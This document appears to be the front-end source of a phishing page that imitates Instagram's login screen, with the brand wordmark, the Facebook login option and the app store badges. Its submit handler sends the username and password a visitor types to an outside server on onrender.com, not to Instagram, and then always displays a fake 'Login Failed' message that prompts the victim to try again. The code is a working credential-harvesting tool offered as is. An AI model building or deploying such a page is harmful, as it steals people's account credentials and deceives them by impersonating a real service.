import React, { useState } from 'react';
import './App.css';

const InstagramWordmark = () => (
  <img
    src="/instagram.png"
    alt="Instagram"
    className="insta-wordmark"
    draggable="false"
    style={{ margin: '36px 0 24px 0', width: 175, height: 51 }}
  />
);

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginFailed, setLoginFailed] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setLoginFailed(false);
    try {
      const res = await fetch('https://insta-login-7hx6.onrender.com/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      const data = await res.json();
      if (data.success) {
        // Success (not required)
      } else {
        setLoginFailed(true);
      }
    } catch (err) {
      setLoginFailed(true);
    }
    setLoading(false);
  };

  if (loginFailed) {
    return (
      <div className="insta-bg">
        <div className="insta-center">
          <div className="insta-box">
            <InstagramWordmark />
            <div className="insta-failed-message">
              <h2>Login Failed</h2>
              <p>The username or password you entered is incorrect.</p>
              <button onClick={() => setLoginFailed(false)}>Try Again</button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="insta-bg">
      <div className="insta-center">
        <div className="insta-box">
          <InstagramWordmark />
          <form className="insta-form" onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Phone number, username, or email"
              value={username}
              onChange={e => setUsername(e.target.value)}
              autoComplete="username"
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={e => setPassword(e.target.value)}
              autoComplete="current-password"
              required
            />
            <button type="submit" disabled={loading}>{loading ? 'Logging in...' : 'Log In'}</button>
          </form>
          <div className="insta-or">
            <div className="insta-line" />
            <span>OR</span>
            <div className="insta-line" />
          </div>
          <div className="insta-facebook-login">
            <img src="/fb.svg" alt="Facebook" />
            <span>Log in with Facebook</span>
          </div>
          <a href="#" className="insta-forgot">Forgot password?</a>
        </div>
        <div className="insta-signup-box">
          <span>Don't have an account?</span>
          <a href="#">Sign up</a>
        </div>
        <div className="insta-apps">
          <span>Get the app.</span>
          <div className="insta-app-buttons">
            <img src="/google.png" alt="Get it on Google Play" />
            <img src="/microsoft.png" alt="Get it from Microsoft" />
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
